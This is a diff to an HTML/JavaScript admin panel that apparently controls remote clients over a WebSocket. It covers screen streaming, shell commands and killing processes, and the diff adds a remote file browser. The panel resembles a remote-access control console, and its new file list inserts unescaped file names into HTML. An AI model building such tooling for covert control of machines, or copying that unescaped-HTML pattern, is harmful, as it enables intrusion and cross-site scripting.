@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Admin Panel - Task Manager Edition</title>
+<title>Admin Panel - Full Edition</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap');
 
@@ -21,7 +21,6 @@
   --text:    #c9d8ef;
   --mono:    'JetBrains Mono', monospace;
   --sans:    'Syne', sans-serif;
-  --ex-w:    380px;
 }
 
 * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -141,8 +140,8 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 .rec { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: blink 1s step-end infinite; }
 @keyframes blink { 50% { opacity: 0; } }
 
-/* ══ TASK MANAGER PANEL ═════════════════════════════ */
-.task-manager-panel {
+/* ══ FILE MANAGER PANEL ═════════════════════════════ */
+.file-panel {
   position: absolute;
   right: 0;
   top: 0;
@@ -157,13 +156,188 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   transition: width .25s cubic-bezier(.4,0,.2,1), border-color .25s;
   z-index: 100;
 }
+.file-panel.open {
+  width: 450px;
+  min-width: 450px;
+  border-left-color: var(--border);
+}
+.file-panel-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surf2);
+  flex-shrink: 0;
+}
+.file-panel-title {
+  font-family: var(--sans);
+  font-weight: 800;
+  font-size: 13px;
+  color: var(--accent);
+  letter-spacing: .12em;
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.file-panel-close {
+  background: none;
+  border: none;
+  color: var(--muted);
+  cursor: pointer;
+  font-size: 20px;
+  padding: 4px 8px;
+  transition: color .12s;
+  line-height: 1;
+}
+.file-panel-close:hover { color: var(--red); }
+.file-nav {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surf);
+  flex-shrink: 0;
+}
+.file-nav-btn {
+  font-family: var(--mono);
+  font-size: 16px;
+  padding: 4px 8px;
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  cursor: pointer;
+  background: transparent;
+  color: var(--text);
+  transition: all .12s;
+  line-height: 1;
+}
+.file-nav-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
+}
+.file-nav-btn:disabled {
+  opacity: .3;
+  cursor: not-allowed;
+}
+.file-path {
+  flex: 1;
+  font-family: var(--mono);
+  font-size: 11px;
+  background: var(--surf2);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 6px 10px;
+  color: var(--text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.file-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px;
+}
+.file-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 12px;
+  border-radius: 6px;
+  cursor: pointer;
+  border: 1px solid transparent;
+  margin-bottom: 2px;
+  transition: all .12s;
+  font-size: 12px;
+}
+.file-item:hover {
+  background: #111a28;
+  border-color: var(--border);
+}
+.file-item-icon {
+  font-size: 16px;
+  flex-shrink: 0;
+  width: 20px;
+  text-align: center;
+}
+.file-item-info {
+  flex: 1;
+  min-width: 0;
+}
+.file-item-name {
+  font-weight: 600;
+  color: var(--text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.file-item-meta {
+  font-size: 10px;
+  color: var(--muted);
+  margin-top: 2px;
+}
+.file-item-actions {
+  display: flex;
+  gap: 6px;
+  opacity: 0;
+  transition: opacity .12s;
+}
+.file-item:hover .file-item-actions {
+  opacity: 1;
+}
+.file-action-btn {
+  font-size: 14px;
+  padding: 4px 6px;
+  border: none;
+  background: transparent;
+  cursor: pointer;
+  color: var(--muted);
+  transition: color .12s;
+}
+.file-action-btn:hover {
+  color: var(--accent);
+}
+.file-empty {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 60px 20px;
+  color: var(--muted);
+}
+.file-empty-icon {
+  font-size: 48px;
+  opacity: .2;
+  margin-bottom: 16px;
+}
+.file-empty-text {
+  font-size: 13px;
+  font-family: var(--sans);
+  letter-spacing: .05em;
+}
+
+/* ══ TASK MANAGER PANEL ═════════════════════════════ */
+.task-manager-panel {
+  position: absolute;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  width: 0;
+  min-width: 0;
+  overflow: hidden;
+  background: var(--surf);
+  border-left: 1px solid transparent;
+  display: flex;
+  flex-direction: column;
+  transition: width .25s cubic-bezier(.4,0,.2,1), border-color .25s;
+  z-index: 101;
+}
 .task-manager-panel.open {
   width: 750px;
   min-width: 750px;
   border-left-color: var(--border);
 }
-
-/* Task Manager Header */
 .tm-header {
   display: flex;
   align-items: center;
@@ -198,8 +372,6 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   line-height: 1;
 }
 .tm-close:hover { color: var(--red); }
-
-/* Task Manager Stats */
 .tm-stats {
   display: flex;
   gap: 12px;
@@ -233,8 +405,6 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 .tm-stat-value.cpu { color: var(--accent); }
 .tm-stat-value.mem { color: var(--green); }
 .tm-stat-value.proc { color: var(--purple); }
-
-/* Task Manager Controls */
 .tm-controls {
   display: flex;
   align-items: center;
@@ -301,8 +471,6 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   color: var(--accent);
   transform: rotate(90deg);
 }
-
-/* Process Table */
 .tm-table-container {
   flex: 1;
   overflow-y: auto;
@@ -398,61 +566,58 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 .tm-table td.status.running { color: var(--green); }
 .tm-table td.status.sleeping { color: var(--muted); }
 .tm-table td.path {
+  max-width: 250px;
   font-size: 10px;
   color: var(--muted);
-  font-family: var(--mono);
-  max-width: 250px;
 }
 .tm-table td.user {
+  max-width: 100px;
   font-size: 10px;
-  color: var(--accent);
 }
 .tm-table td.actions {
   text-align: right;
 }
 .tm-end-btn {
+  font-family: var(--mono);
   font-size: 10px;
-  font-weight: 700;
+  font-weight: 600;
   padding: 4px 10px;
   border: 1px solid var(--border);
   border-radius: 4px;
   cursor: pointer;
   background: transparent;
-  color: var(--muted);
-  font-family: var(--mono);
+  color: var(--red);
   transition: all .12s;
 }
 .tm-end-btn:hover {
+  background: rgba(255,51,102,.12);
   border-color: var(--red);
-  color: var(--red);
-  background: rgba(255,51,102,.08);
 }
-
-/* Process Details Panel */
 .tm-details {
-  border-top: 2px solid var(--border);
+  max-height: 0;
+  overflow: hidden;
+  border-top: 1px solid transparent;
   background: var(--surf2);
-  padding: 14px 16px;
-  max-height: 180px;
-  overflow-y: auto;
-  display: none;
-  flex-shrink: 0;
+  transition: max-height .3s ease-out, border-color .3s;
 }
 .tm-details.show {
-  display: block;
+  max-height: 400px;
+  border-top-color: var(--border);
 }
 .tm-details-title {
-  font-size: 10px;
-  color: var(--muted);
-  letter-spacing: .1em;
-  text-transform: uppercase;
+  font-family: var(--sans);
   font-weight: 700;
-  margin-bottom: 10px;
+  font-size: 12px;
+  color: var(--purple);
+  letter-spacing: .08em;
+  text-transform: uppercase;
+  padding: 12px 16px 8px;
 }
 .tm-details-grid {
   display: grid;
   grid-template-columns: repeat(2, 1fr);
-  gap: 12px 20px;
+  gap: 12px;
+  padding: 0 16px 12px;
 }
 .tm-detail-item {
   display: flex;
@@ -467,36 +632,40 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   font-weight: 600;
 }
 .tm-detail-value {
-  font-size: 12px;
-  color: var(--text);
+  font-size: 13px;
   font-weight: 600;
-  word-break: break-all;
+  color: var(--text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
 }
 .tm-detail-value.path {
-  font-family: var(--mono);
-  font-size: 10px;
-  color: var(--accent);
+  font-size: 11px;
+  word-break: break-all;
+  white-space: normal;
 }
 .tm-details-actions {
-  margin-top: 14px;
   display: flex;
   gap: 8px;
+  padding: 0 16px 16px;
 }
 .tm-detail-btn {
-  font-size: 10px;
+  font-family: var(--mono);
+  font-size: 11px;
   font-weight: 600;
-  padding: 6px 14px;
+  padding: 7px 14px;
   border: 1px solid var(--border);
   border-radius: 5px;
   cursor: pointer;
   background: transparent;
   color: var(--text);
-  font-family: var(--mono);
   transition: all .12s;
+  flex: 1;
 }
 .tm-detail-btn:hover {
   border-color: var(--accent);
   color: var(--accent);
+  background: rgba(0,229,255,.08);
 }
 .tm-detail-btn.danger {
   border-color: var(--red);
@@ -505,8 +674,6 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 .tm-detail-btn.danger:hover {
   background: rgba(255,51,102,.12);
 }
-
-/* Empty State */
 .tm-empty {
   display: flex;
   flex-direction: column;
@@ -525,8 +692,6 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   font-family: var(--sans);
   letter-spacing: .05em;
 }
-
-/* Loading Spinner */
 .tm-loading {
   display: flex;
   align-items: center;
@@ -547,7 +712,7 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
   flex-shrink: 0;
 }
 
-/* ══ OUTPUT LOG (Moved to bottom for better visibility) ══ */
+/* ══ OUTPUT LOG ═════════════════════════════════════ */
 .output-panel {
   height: 130px;
   background: var(--surf);
@@ -590,6 +755,7 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
     <input class="cmd-input" id="cmdInput" placeholder="Shell command…" onkeydown="if(event.key==='Enter')sendCmd()">
     <button class="btn" onclick="sendCmd()">Run</button>
     <div class="divider"></div>
+    <button class="btn" id="filesBtn" onclick="toggleFileManager()">📁 Files</button>
     <button class="btn" id="taskBtn" onclick="toggleTaskManager()">⚙️ Tasks</button>
     <div class="divider"></div>
     <div class="stat-badge" id="fpsBadge">-- FPS</div>
@@ -613,6 +779,36 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
       <img class="screen-img" id="screenImg" alt="">
       <div class="live-badge" id="liveBadge"><div class="rec"></div>LIVE</div>
     </div>
+
+    <!-- ══ FILE MANAGER PANEL ══════════════════════════ -->
+    <div class="file-panel" id="filePanel">
+      
+      <!-- Header -->
+      <div class="file-panel-header">
+        <div class="file-panel-title">
+          <span>📁</span>
+          <span>File Explorer</span>
+        </div>
+        <button class="file-panel-close" onclick="toggleFileManager()">×</button>
+      </div>
+
+      <!-- Navigation -->
+      <div class="file-nav">
+        <button class="file-nav-btn" id="btnBack" onclick="goBack()" disabled>←</button>
+        <button class="file-nav-btn" id="btnUp" onclick="goUp()">↑</button>
+        <button class="file-nav-btn" onclick="refreshFiles()">↻</button>
+        <div class="file-path" id="currentPath">~</div>
+      </div>
+
+      <!-- File List -->
+      <div class="file-list" id="fileList">
+        <div class="file-empty">
+          <div class="file-empty-icon">📂</div>
+          <div class="file-empty-text">Select a client and click refresh</div>
+        </div>
+      </div>
+
+    </div><!-- /file-panel -->
 
     <!-- ══ TASK MANAGER PANEL ══════════════════════════ -->
     <div class="task-manager-panel" id="taskManagerPanel">
@@ -708,7 +904,7 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 
   <!-- OUTPUT LOG -->
   <div class="output-panel" id="output">
-    <div class="log info">[SYSTEM] Panel ready - Task Manager Edition</div>
+    <div class="log info">[SYSTEM] Panel ready - Full Edition (Files + Tasks)</div>
   </div>
 
 </div><!-- /main -->
@@ -724,10 +920,13 @@ let frameCount       = 0;
 let fpsTimer         = null;
 let lastFrameTs      = 0;
 let tmOpen           = false;
+let fileOpen         = false;
 let processes        = [];
 let selectedProcess  = null;
 let sortField        = 'cpu';
 let sortDirection    = 'desc';
+let currentPath      = '';
+let pathHistory      = [];
 
 // ════════════════════════════════════════════════════════════
 //  WEBSOCKET CONNECTION
@@ -802,7 +1001,6 @@ function handleMessage(msg) {
     case 'kill_result':
       if (msg.client_id === selClient) {
         log(`Kill process: ${msg.result}`, msg.result.includes('ERROR') ? 'error' : 'result');
-        // Refresh processes after kill
         setTimeout(() => requestProcesses(), 500);
       }
       break;
@@ -810,6 +1008,24 @@ function handleMessage(msg) {
     case 'sysinfo':
       if (msg.client_id === selClient && msg.data) {
         updateSysStats(msg.data);
+      }
+      break;
+
+    case 'directory_list':
+      if (msg.client_id === selClient) {
+        handleDirectoryList(msg.data, msg.path);
+      }
+      break;
+
+    case 'drives_list':
+      if (msg.client_id === selClient) {
+        handleDrivesList(msg.data);
+      }
+      break;
+
+    case 'file_content':
+      if (msg.client_id === selClient) {
+        handleFileContent(msg.data, msg.path);
       }
       break;
   }
@@ -837,7 +1053,6 @@ function renderClients(clients) {
 function selectClient(id) {
   if (selClient === id) return;
   
-  // Stop streaming from old client
   if (isStreaming) {
     stopStream();
   }
@@ -845,17 +1060,17 @@ function selectClient(id) {
   selClient = id;
   log(`Selected client: ${id}`, 'info');
   
-  // Update UI
   renderClients(document.querySelectorAll('.client-item').length > 0 ? 
     Array.from(document.querySelectorAll('.client-item')).map(el => el.textContent.trim()) : []);
   
-  // Show placeholder
   document.getElementById('placeholder').style.display = 'flex';
   document.getElementById('screenImg').classList.remove('show');
   
-  // Request initial data if task manager is open
   if (tmOpen) {
     requestProcesses();
+  }
+  if (fileOpen) {
+    refreshFiles();
   }
 }
 
@@ -889,16 +1104,14 @@ function startStream() {
   isStreaming = true;
   frameCount = 0;
   
-  // Update UI
   document.getElementById('streamBtn').classList.add('active-stream');
   document.getElementById('streamBtn').textContent = '■ Stop';
   document.getElementById('liveBadge').classList.add('show');
   document.getElementById('placeholder').style.display = 'none';
   
-  // Start FPS counter
   fpsTimer = setInterval(updateFPS, 1000);
   
-  log(`Streaming started from ${selClient}`, 'result');
+  log(`Started streaming from ${selClient}`, 'info');
 }
 
 function stopStream() {
@@ -911,48 +1124,55 @@ function stopStream() {
 
   isStreaming = false;
   
-  // Update UI
   document.getElementById('streamBtn').classList.remove('active-stream');
   document.getElementById('streamBtn').textContent = '▶ Stream';
   document.getElementById('liveBadge').classList.remove('show');
   
-  // Stop FPS counter
   if (fpsTimer) {
     clearInterval(fpsTimer);
     fpsTimer = null;
   }
   
-  log('Streaming stopped', 'info');
+  document.getElementById('fpsBadge').textContent = '-- FPS';
+  document.getElementById('latBadge').textContent = '-- ms';
+  
+  log('Stopped streaming', 'info');
 }
 
 function handleStreamFrame(msg) {
   const img = document.getElementById('screenImg');
+  const placeholder = document.getElementById('placeholder');
+  
   img.src = 'data:image/jpeg;base64,' + msg.image;
   img.classList.add('show');
+  placeholder.style.display = 'none';
   
   frameCount++;
-  lastFrameTs = Date.now();
   
-  // Update latency
-  if (msg.ts) {
+  if (msg.ts && lastFrameTs) {
     const latency = Date.now() - msg.ts;
     updateLatency(latency);
   }
+  lastFrameTs = msg.ts;
 }
 
 function updateFPS() {
-  const badge = document.getElementById('fpsBadge');
-  badge.textContent = `${frameCount} FPS`;
-  
-  if (frameCount > 15) {
-    badge.className = 'stat-badge good';
-  } else if (frameCount > 8) {
-    badge.className = 'stat-badge mid';
-  } else {
-    badge.className = 'stat-badge low';
-  }
-  
+  const fps = frameCount;
   frameCount = 0;
+  
+  const badge = document.getElementById('fpsBadge');
+  badge.textContent = `${fps} FPS`;
+  
+  if (fps >= 15) {
+    badge.classList.remove('mid', 'low');
+    badge.classList.add('good');
+  } else if (fps >= 8) {
+    badge.classList.remove('good', 'low');
+    badge.classList.add('mid');
+  } else {
+    badge.classList.remove('good', 'mid');
+    badge.classList.add('low');
+  }
 }
 
 function updateLatency(ms) {
@@ -960,11 +1180,14 @@ function updateLatency(ms) {
   badge.textContent = `${ms} ms`;
   
   if (ms < 100) {
-    badge.className = 'stat-badge good';
-  } else if (ms < 200) {
-    badge.className = 'stat-badge mid';
+    badge.classList.remove('mid', 'low');
+    badge.classList.add('good');
+  } else if (ms < 250) {
+    badge.classList.remove('good', 'low');
+    badge.classList.add('mid');
   } else {
-    badge.className = 'stat-badge low';
+    badge.classList.remove('good', 'mid');
+    badge.classList.add('low');
   }
 }
 
@@ -991,11 +1214,13 @@ function reqScreenshot() {
   log('Requesting screenshot...', 'info');
 }
 
-function showScreenshot(imageData) {
+function showScreenshot(base64Image) {
   const img = document.getElementById('screenImg');
-  img.src = 'data:image/jpeg;base64,' + imageData;
+  const placeholder = document.getElementById('placeholder');
+  
+  img.src = 'data:image/jpeg;base64,' + base64Image;
   img.classList.add('show');
-  document.getElementById('placeholder').style.display = 'none';
+  placeholder.style.display = 'none';
 }
 
 // ════════════════════════════════════════════════════════════
@@ -1027,6 +1252,147 @@ function sendCmd() {
 }
 
 // ════════════════════════════════════════════════════════════
+//  FILE MANAGER
+// ════════════════════════════════════════════════════════════
+function toggleFileManager() {
+  fileOpen = !fileOpen;
+  const panel = document.getElementById('filePanel');
+  const btn = document.getElementById('filesBtn');
+  
+  if (fileOpen) {
+    // Tắt Task Manager nếu đang mở
+    if (tmOpen) {
+      tmOpen = false;
+      document.getElementById('taskManagerPanel').classList.remove('open');
+      document.getElementById('taskBtn').classList.remove('task-active');
+    }
+    
+    panel.classList.add('open');
+    btn.classList.add('files-active');
+    if (selClient) {
+      refreshFiles();
+    }
+  } else {
+    panel.classList.remove('open');
+    btn.classList.remove('files-active');
+  }
+}
+
+function refreshFiles() {
+  if (!selClient) {
+    log('Please select a client first', 'warn');
+    return;
+  }
+
+  if (!ws || ws.readyState !== WebSocket.OPEN) {
+    log('WebSocket not connected', 'error');
+    return;
+  }
+
+  const path = currentPath || '.';
+  
+  ws.send(JSON.stringify({
+    type: 'list_directory',
+    client_id: selClient,
+    path: path
+  }));
+
+  log(`Listing directory: ${path}`, 'info');
+}
+
+function handleDirectoryList(data, path) {
+  if (data.error) {
+    log(`Error listing directory: ${data.error}`, 'error');
+    return;
+  }
+
+  currentPath = data.path || path;
+  document.getElementById('currentPath').textContent = currentPath;
+
+  const container = document.getElementById('fileList');
+  
+  if (!data.items || data.items.length === 0) {
+    container.innerHTML = `
+      <div class="file-empty">
+        <div class="file-empty-icon">📂</div>
+        <div class="file-empty-text">Empty directory</div>
+      </div>
+    `;
+    return;
+  }
+
+  const html = data.items.map(item => {
+    const icon = item.type === 'dir' ? '📁' : '📄';
+    const size = item.type === 'file' ? formatSize(item.size) : '';
+    const name = item.name;
+    
+    return `
+      <div class="file-item" ondblclick="openItem('${name}', '${item.type}')">
+        <div class="file-item-icon">${icon}</div>
+        <div class="file-item-info">
+          <div class="file-item-name">${name}</div>
+          <div class="file-item-meta">${size}</div>
+        </div>
+        <div class="file-item-actions">
+          ${item.type === 'file' ? `<button class="file-action-btn" onclick="event.stopPropagation(); downloadFile('${name}')" title="Download">⬇️</button>` : ''}
+          <button class="file-action-btn" onclick="event.stopPropagation(); viewFile('${name}')" title="View">👁️</button>
+        </div>
+      </div>
+    `;
+  }).join('');
+
+  container.innerHTML = html;
+}
+
+function openItem(name, type) {
+  if (type === 'dir') {
+    pathHistory.push(currentPath);
+    const newPath = currentPath === '/' ? `/${name}` : `${currentPath}/${name}`;
+    currentPath = newPath;
+    refreshFiles();
+    document.getElementById('btnBack').disabled = false;
+  }
+}
+
+function goBack() {
+  if (pathHistory.length > 0) {
+    currentPath = pathHistory.pop();
+    refreshFiles();
+    if (pathHistory.length === 0) {
+      document.getElementById('btnBack').disabled = true;
+    }
+  }
+}
+
+function goUp() {
+  const parts = currentPath.split('/').filter(p => p);
+  if (parts.length > 0) {
+    parts.pop();
+    currentPath = '/' + parts.join('/');
+    if (!currentPath || currentPath === '/') currentPath = '.';
+    refreshFiles();
+  }
+}
+
+function formatSize(bytes) {
+  if (bytes === 0) return '0 B';
+  const k = 1024;
+  const sizes = ['B', 'KB', 'MB', 'GB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+function downloadFile(filename) {
+  log(`Downloading: ${filename}`, 'info');
+  // Implementation needed
+}
+
+function viewFile(filename) {
+  log(`Viewing: ${filename}`, 'info');
+  // Implementation needed
+}
+
+// ════════════════════════════════════════════════════════════
 //  TASK MANAGER
 // ════════════════════════════════════════════════════════════
 function toggleTaskManager() {
@@ -1035,9 +1401,15 @@ function toggleTaskManager() {
   const btn = document.getElementById('taskBtn');
   
   if (tmOpen) {
+    // Tắt File Manager nếu đang mở
+    if (fileOpen) {
+      fileOpen = false;
+      document.getElementById('filePanel').classList.remove('open');
+      document.getElementById('filesBtn').classList.remove('files-active');
+    }
+    
     panel.classList.add('open');
     btn.classList.add('task-active');
-    
     if (selClient) {
       requestProcesses();
       requestSysInfo();
@@ -1063,12 +1435,12 @@ function requestProcesses() {
     type: 'request_processes',
     client_id: selClient
   }));
-
-  log('Requesting process list...', 'info');
 }
 
 function requestSysInfo() {
-  if (!selClient || !ws || ws.readyState !== WebSocket.OPEN) return;
+  if (!selClient) return;
+
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
   ws.send(JSON.stringify({
     type: 'request_sysinfo',
@@ -1077,41 +1449,22 @@ function requestSysInfo() {
 }
 
 function handleProcessesData(data) {
-  if (data.error) {
-    log(`Error loading processes: ${data.error}`, 'error');
-    showEmptyState('Error loading processes');
-    return;
-  }
-
   if (!Array.isArray(data)) {
     log('Invalid process data received', 'error');
     return;
   }
 
   processes = data;
-  log(`Loaded ${processes.length} processes`, 'result');
-  
-  // Update process count
-  document.getElementById('tmProcStat').textContent = processes.length;
-  
-  // Calculate average CPU
-  const avgCpu = processes.reduce((sum, p) => sum + (p.cpu || 0), 0) / processes.length;
-  document.getElementById('tmCpuStat').textContent = avgCpu.toFixed(1) + '%';
-  
-  // Calculate average Memory
-  const avgMem = processes.reduce((sum, p) => sum + (p.memory || 0), 0) / processes.length;
-  document.getElementById('tmMemStat').textContent = avgMem.toFixed(1) + '%';
-  
   renderProcessTable();
+  
+  document.getElementById('tmProcStat').textContent = data.length;
 }
 
-function updateSysStats(sysinfo) {
-  if (sysinfo.cpu_percent !== undefined) {
-    document.getElementById('tmCpuStat').textContent = sysinfo.cpu_percent.toFixed(1) + '%';
-  }
-  if (sysinfo.memory_percent !== undefined) {
-    document.getElementById('tmMemStat').textContent = sysinfo.memory_percent.toFixed(1) + '%';
-  }
+function updateSysStats(data) {
+  if (!data) return;
+
+  document.getElementById('tmCpuStat').textContent = `${data.cpu_percent}%`;
+  document.getElementById('tmMemStat').textContent = `${data.memory_percent}%`;
 }
 
 function renderProcessTable() {
@@ -1122,14 +1475,12 @@ function renderProcessTable() {
     return;
   }
 
-  // Sort processes
   const sorted = [...processes].sort((a, b) => {
     const aVal = a[sortField] || 0;
     const bVal = b[sortField] || 0;
     return sortDirection === 'desc' ? bVal - aVal : aVal - bVal;
   });
 
-  // Filter by search
   const search = document.getElementById('tmSearch').value.toLowerCase();
   const filtered = search ? sorted.filter(p => 
     p.name.toLowerCase().includes(search) ||
@@ -1187,7 +1538,6 @@ function selectProcess(pid) {
 
   selectedProcess = process;
   
-  // Update details panel
   document.getElementById('detailPid').textContent = process.pid;
   document.getElementById('detailName').textContent = process.name;
   document.getElementById('detailCpu').textContent = process.cpu.toFixed(2) + '%';
@@ -1197,10 +1547,7 @@ function selectProcess(pid) {
   document.getElementById('detailUser').textContent = process.user || 'N/A';
   document.getElementById('detailPath').textContent = process.path || 'N/A';
   
-  // Show details panel
   document.getElementById('tmDetails').classList.add('show');
-  
-  // Re-render table to update selection
   renderProcessTable();
 }
 
@@ -1212,7 +1559,6 @@ function sortBy(field) {
     sortDirection = 'desc';
   }
   
-  // Update button states
   document.querySelectorAll('.tm-sort-btn').forEach(btn => btn.classList.remove('active'));
   if (field === 'cpu') {
     document.getElementById('sortCpuBtn').classList.add('active');
@@ -1274,14 +1620,11 @@ function openLocation() {
     return;
   }
 
-  // Extract directory from path
   const path = selectedProcess.path;
   const lastSlash = Math.max(path.lastIndexOf('/'), path.lastIndexOf('\\'));
   const directory = lastSlash > 0 ? path.substring(0, lastSlash) : path;
 
   log(`Opening location: ${directory}`, 'info');
-  // You could send a command to open the directory here
-  // For now, just log it
 }
 
 function showEmptyState(message) {
@@ -1326,7 +1669,6 @@ function updateStatus(status, text) {
 window.addEventListener('DOMContentLoaded', () => {
   connectWS();
   
-  // Auto-refresh processes every 3 seconds when task manager is open
   setInterval(() => {
     if (tmOpen && selClient) {
       requestProcesses();
@@ -1335,15 +1677,17 @@ window.addEventListener('DOMContentLoaded', () => {
   }, 3000);
 });
 
-// Handle keyboard shortcuts
 document.addEventListener('keydown', (e) => {
-  // Ctrl/Cmd + K: Open Task Manager
   if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
     e.preventDefault();
     toggleTaskManager();
   }
   
-  // Ctrl/Cmd + R: Refresh processes
+  if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
+    e.preventDefault();
+    toggleFileManager();
+  }
+  
   if ((e.ctrlKey || e.metaKey) && e.key === 'r' && tmOpen) {
     e.preventDefault();
     requestProcesses();
